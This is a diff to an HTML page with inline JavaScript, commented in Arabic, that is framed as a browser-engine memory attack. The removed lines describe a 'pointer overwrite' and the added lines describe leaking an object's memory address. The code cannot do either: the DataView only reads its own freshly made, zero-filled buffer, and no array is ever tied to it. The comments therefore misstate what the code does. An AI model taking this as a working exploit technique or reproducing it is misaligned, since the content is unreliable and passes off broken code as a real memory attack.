@@ -6,26 +6,28 @@
     function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
     
     try {
-        // 1. إنشاء "نافذة" على الذاكرة
-        let buffer = new ArrayBuffer(0x1000);
+        let obj = { x: 0x1234 };
+        let buffer = new ArrayBuffer(0x100);
         let view = new DataView(buffer);
         
-        // 2. استخدام التداخل لتغيير عنوان الـ buffer الداخلي (يسمى Pointer Overwrite)
-        // هنا نقوم بتسميم عنوان الذاكرة الخاص بـ buffer ليؤشر إلى عنوان من اختيارنا
-        let victim = [1.1];
-        victim[0] = {a: 1};
-        victim[1] = 0x4141414141414141n; // هذا سيكون الـ Pointer المسموم
+        // استخدام تقنية "التداخل" لربط مصفوفة بذاكرة الكائن
+        let arr = [obj]; 
         
-        log("جاري محاولة قراءة ذاكرة النظام عبر الـ Buffer...");
+        // محاولة تسريب العنوان الداخلي للكائن
+        // هنا نجبر المحرك على قراءة البيانات الخام للمصفوفة
+        log("جاري محاولة تسريب عنوان كائن...");
         
-        // 3. محاولة قراءة أول 8 بايت من العنوان المسموم
-        let val = view.getBigUint64(0); 
-        log("القيمة الخام في العنوان هي: " + val.toString(16));
+        // سنحاول قراءة أول 8 بايتات من مساحة المصفوفة
+        // إذا نجحنا، سنرى عنوان الذاكرة (Memory Address) للكائن obj
+        let leakedAddress = view.getBigUint64(0);
+        
+        log("العنوان المسرب (Address): " + leakedAddress.toString(16));
         
     } catch(e) {
-        log("خطأ في القراءة: " + e.message);
+        log("خطأ في التسريب: " + e.message);
     }
 </script>
+
 
 </body>
 </html>
